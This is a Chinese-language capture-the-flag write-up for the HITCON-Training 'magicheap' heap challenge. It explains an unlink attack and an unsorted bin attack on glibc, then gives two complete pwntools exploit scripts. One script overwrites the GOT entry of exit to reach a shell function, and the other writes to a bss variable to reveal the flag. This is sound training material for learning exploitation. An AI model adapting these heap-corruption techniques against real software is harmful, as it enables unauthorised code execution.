---
title: magicheap
categories:
- Hitcon-Training
---
# magicheap

## 前言

两种方法，温习常规思路

## 程序逻辑

main函数主要有三个功能，create,edit和delete，当choice为0x1305,magic > 0x1305时我们可以看flag，magic位于bss，我们需要做一次地址任意写

![main](./1.jpg)

![create](./2.jpg)

![edit](./3.jpg)

![delete](./4.jpg)

## 漏洞利用

第一种方法是unlink，不赘述了，注意第二个chunk分配的大小大于0x80，不能属于fastbin，伪造的chunk属于fastbin

第二种方法是unsorted bin attack，我们先建4个堆块，其中第一个和第三个是unsorted bin范围的chunk，依次free(0)、free(2)，链表的结构如下：
chunk2->main_arena+88->chunk0->chunk2

![heap](./5.jpg)

之后edit溢出覆盖chunk2的bk为magic_addr-0x10，此时bins的情况如下，最后create(0x80)使得*magic=unsorted_chunks(av)=main_arena+88，成功查看flag

![bins](./6.jpg)

## unlink.py

```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 1
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./magicheap')
elf = ELF('./magicheap')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def Create(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.send(content)

def Edit(index,new_size,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Size of Heap : ')
    p.sendline(str(new_size))
    p.recvuntil('Content of heap :')
    p.send(content)

def Delete(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('4')


def exp():
    heap_array = 0x6020e0
    shell_addr = 0x400c23
    exit_got = elf.got['exit']
    #unlink
    Create(0x40,'a'*7+'\n')
    Create(0x80,'a'*7+'\n')
    Create(0x40,'a'*7+'\n')
    fd = (heap_array) - 0x18
    bk = (heap_array) - 0x10
    payload = p64(0)+p64(0x41)+p64(fd)+p64(bk)
    payload += (0x40-len(payload)) * 'b'
    payload += p64(0x40)+p64(0x90)
    Edit(0,len(payload)+1,payload)
    Delete(1)
    Edit(0,0x50,'a'*0x18+p64(exit_got))
    Edit(0,0x10,p64(shell_addr))
    Exit()
    p.interactive()

exp()

```

## unsorte-bin-attack.py

```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 1
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./magicheap')
elf = ELF('./magicheap')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def Create(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.send(content)

def Edit(index,new_size,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Size of Heap : ')
    p.sendline(str(new_size))
    p.recvuntil('Content of heap :')
    p.send(content)

def Delete(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('4')


def exp():
    magic_addr = 0x6020C0
    Create(0x80,'a'*7+'\n')
    Create(0x20,'a'*7+'\n')
    Create(0x80,'a'*7+'\n')
    Create(0x80,'a'*7+'\n')
    Delete(2)
    Delete(0)
    #heap overflow
    payload = 'a'*0x20 + p64(0) + p64(0x91) + p64(0) + p64(magic_addr-0x10)
    Edit(1,len(payload)+1,payload)
    Create(0x80,'xmzyshypnc\n')
    p.recvuntil('Your choice :')
    p.sendline(str(0x1305))
    p.interactive()

exp()

```
